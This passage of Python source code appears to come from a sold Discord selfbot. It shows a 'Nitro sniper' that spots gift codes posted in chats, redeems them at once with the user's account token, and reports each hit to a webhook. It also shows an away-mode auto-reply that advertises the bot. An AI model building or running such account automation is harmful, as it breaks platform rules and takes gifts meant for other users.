  nitro = re.search(regex, message.content)
  try:
     if nitro_sniper == True:
         start = datetime.now()
         code = nitro.group(0).split("/")[1].rstrip()
         headers = {'Authorization': token}
         r = requests.post(
             f'https://discordapp.com/api/v6/entitlements/gift-codes/{code.replace("discord.gift/", "")}/redeem', 
             headers=headers,
         ).text
     elapsed = datetime.now() - start
     if 'Unknown Gift Code' in r:
         print(f'\033[31mInvalid Nitro Code\n\033[31mCode: \033[97m{code}\n\033[31mTime: \033[97m{elapsed.seconds}.{str(elapsed.microseconds)[3:]}s')
     elif 'subscription_plan' in r:
         print(f'\033[92m[Nitro Sniped\n\033[31mCode: \033[97m{code}\n\033[31mTime: \033[97m{elapsed.seconds}.{str(elapsed.microseconds)[3:]}s')
         webhook = DiscordWebhook(url=f'{nitrowebhook}', username="Nitro Sniper", avatar='https://pbs.twimg.com/media/EWdeUeHXkAQgJh7.png')
         embed = DiscordEmbed(title='**Nitro Sniper**', description=f'***Code***: {code}\n***Time***: {elapsed.seconds}.{str(elapsed.microseconds)[3:]}s\n***Server***: {message.guild}\n***Channel***: {message.channel}\n***Author***: {message.author}', color=242424, inline=False)
         embed.set_timestamp()
         embed.set_thumbnail(url='https://pbs.twimg.com/media/EWdeUeHXkAQgJh7.png')
         webhook.add_embed(embed)
         response = webhook.execute()
     elif 'This gift has been redeemed already.' in r:
         print(f'\033[31mNitro Already Redeemed\n\033[31mCode: \033[97m{code}\n\033[31mTime: \033[97m{elapsed.seconds}.{str(elapsed.microseconds)[3:]}s')
     else:
         return
  except (AttributeError):
      pass
 
  global afk_log
  if afk_log == 1:
      if message.guild is None:
          
          if message.author == Dan3xo.user:
              return
          embed = discord.Embed(title="**AFK Message**", description=f"Hi {message.author.mention} \n{afk_message}", color=discord.Color(int(color, 16)))
          embed.add_field(name=f"__{Dan3xo.user.name}'s Instagram__", value=f"[**Instagram**]({instagram})", inline=False)
          embed.add_field(name="__Wanna Buy Aqua Selfbot?__", value=f"*DM* **Dan3xo#9628 ** *Or Join The Server,*  [**Discord**](none)", inline=False)
          embed.set_thumbnail(url=Dan3xo.user.avatar_url)
          embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
          print(f'\033[31mAFK MODE \033[97m| DM From {message.author.name}')
          await message.channel.send(embed=embed)


if __name__ == '__main__':
    Init()